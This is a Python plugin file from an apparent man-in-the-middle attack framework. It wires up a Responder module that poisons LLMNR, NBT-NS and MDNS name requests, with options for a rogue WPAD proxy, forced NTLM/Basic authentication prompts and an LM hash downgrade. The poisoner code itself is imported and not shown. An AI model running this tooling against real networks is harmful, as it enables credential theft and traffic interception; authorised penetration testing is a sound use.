#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import flask

from plugins.plugin import Plugin
from twisted.internet import reactor

class Responder(Plugin):
    name        = "Responder"
    optname     = "responder"
    desc        = "Poison LLMNR, NBT-NS and MDNS requests"
    tree_info   = ["NBT-NS, LLMNR & MDNS Responder v2.1.2 by Laurent Gaffie online"]
    version     = "0.2"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options   = options
        self.interface = options.interface
        self.ip        = options.ip

        # Load (M)DNS, NBNS and LLMNR Poisoners
        from core.poisoners.LLMNR import LLMNR
        from core.poisoners.MDNS import MDNS
        from core.poisoners.NBTNS import NBTNS
        LLMNR().start()
        MDNS().start()
        NBTNS().start()

    def reactor(self, strippingFactory):
        reactor.listenTCP(3141, strippingFactory)

    def options(self, options):
        options.add_argument('--analyze',       dest="analyze",action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests without poisoning")
        options.add_argument('--wredir',        dest="wredir", action="store_true", help="Enables answers for netbios wredir suffix queries")
        options.add_argument('--nbtns',         dest="nbtns",  action="store_true", help="Enables answers for netbios domain suffix queries")
        options.add_argument('--fingerprint',   dest="finger", action="store_true", help="Fingerprint hosts that issued an NBT-NS or LLMNR query")
        options.add_argument('--lm',            dest="lm",     action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier")
        options.add_argument('--wpad',          dest="wpad",   action="store_true", help="Start the WPAD rogue proxy server")
        options.add_argument('--forcewpadauth', dest="forcewpadauth", action="store_true", help="Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        options.add_argument('--basic',         dest="basic",         action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
